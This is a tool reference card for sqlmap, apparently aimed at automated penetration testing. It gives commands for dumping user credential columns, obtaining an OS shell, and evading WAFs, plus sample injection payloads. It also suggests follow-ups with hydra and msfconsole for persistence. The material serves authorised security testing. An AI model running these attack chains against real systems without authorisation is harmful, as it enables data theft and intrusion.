# sqlmap - Automated SQL Injection Tool

## Overview
| Attribute | Value |
|-----------|-------|
| Binary | `sqlmap` |
| Category | Web Exploitation |
| Risk Level | High |

## Description
sqlmap is an open-source automated SQL injection detection and exploitation tool. It supports multiple database backends, can automatically identify injection types, and extract data from vulnerable parameters.

---

## Usage Patterns

### 1. Basic URL Test
**Goal:** Test a URL parameter for SQL injection.
```bash
sqlmap -u "http://target.com/page?id=1"
```

### 2. POST Request Test
**Goal:** Test POST parameters.
```bash
sqlmap -u "http://target.com/login" --data "user=admin&pass=123"
```

### 3. With Cookie
**Goal:** Test authenticated endpoints.
```bash
sqlmap -u "http://target.com/page?id=1" --cookie "session=abc123"
```

### 4. Enumerate Databases
**Goal:** List all databases on the backend.
```bash
sqlmap -u "http://target.com/page?id=1" --dbs
```

### 5. Enumerate Tables
**Goal:** List tables in a specific database.
```bash
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
```

### 6. Enumerate Columns
**Goal:** List columns in a specific table.
```bash
sqlmap -u "http://target.com/page?id=1" -D db -T users --columns
```

### 7. Dump Data
**Goal:** Extract data from specific columns.
```bash
sqlmap -u "http://target.com/page?id=1" -D db -T users -C username,password --dump
```

### 8. Get OS Shell
**Goal:** Obtain an operating system shell via SQL injection.
```bash
sqlmap -u "http://target.com/page?id=1" --os-shell
```

### 9. Batch Automation
**Goal:** Run without interactive prompts.
```bash
sqlmap -u "http://target.com/page?id=1" --batch
```

---

## Common Options
| Option | Description |
|--------|-------------|
| `-u` | Target URL |
| `--data` | POST data |
| `--cookie` | Cookie string |
| `-p` | Specific parameter to test |
| `--dbs` | Enumerate databases |
| `-D` | Specify database |
| `--tables` | Enumerate tables |
| `-T` | Specify table |
| `--columns` | Enumerate columns |
| `-C` | Specify columns |
| `--dump` | Dump data |
| `--batch` | Auto-confirm all prompts |
| `--level` | Test level (1-5, higher = more tests) |
| `--risk` | Risk level (1-3, higher = more aggressive) |
| `--proxy` | Proxy URL |
| `--tamper` | Tamper script for WAF bypass |

---

## Output Parsing

### Sample Output
```
[*] starting @ 10:30:15 /2024-01-15/

[10:30:15] [INFO] testing connection to the target URL
[10:30:16] [INFO] testing if the target URL content is stable
[10:30:17] [INFO] target URL content is stable
[10:30:18] [INFO] testing if GET parameter 'id' is dynamic
[10:30:18] [INFO] GET parameter 'id' appears to be dynamic
[10:30:19] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[10:30:22] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

sqlmap identified the following injection point(s):
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7178787871,0x...),NULL-- -

    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5839=5839
---

[10:30:30] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
```

### Parsing Rules
- `[INFO]` lines = progress updates
- `"is injectable"` / `"is vulnerable"` = confirmed injection point
- `Parameter:` block = injection type details and payloads
- `back-end DBMS:` = identified database type and version
- `--dump` output shows table data in ASCII table format
- `--batch` suppresses interactive prompts for automation

---

## Next Steps

| Finding | Recommended Next Tool | Example |
|---------|----------------------|---------|
| SQL injection confirmed | Continue with `sqlmap` | `sqlmap -u "URL" --dbs` |
| Database names found | Enumerate tables | `sqlmap -u "URL" -D dbname --tables` |
| Credentials dumped | `hydra` to test credential reuse | `hydra -l user -p pass target ssh` |
| OS shell obtained | `msfconsole` for persistence | `use exploit/multi/handler` |
| WAF detected | Adjust tamper scripts | `sqlmap -u "URL" --tamper=space2comment` |

---

## Safety Warnings
| Risk | Description |
|------|-------------|
| **Data Destruction** | `--os-shell` can execute arbitrary system commands. |
| **Detection** | sqlmap has well-known traffic signatures; easily blocked by WAF. |
| **Legal** | Unauthorized use is illegal. |

> **Warning:** Only use on targets with explicit written authorization.

---

## Common Errors & Solutions
| Error | Cause | Solution |
|-------|-------|----------|
| `connection timed out` | Target unreachable | Verify target URL and connectivity |
| `WAF/IPS detected` | Request filtering active | Use `--tamper` scripts or `--random-agent` |
| `parameter not injectable` | No SQL injection found | Try `--level 5 --risk 3` for deeper testing |
| `back-end DBMS not identified` | Unable to fingerprint DB | Manually specify with `--dbms=mysql` |
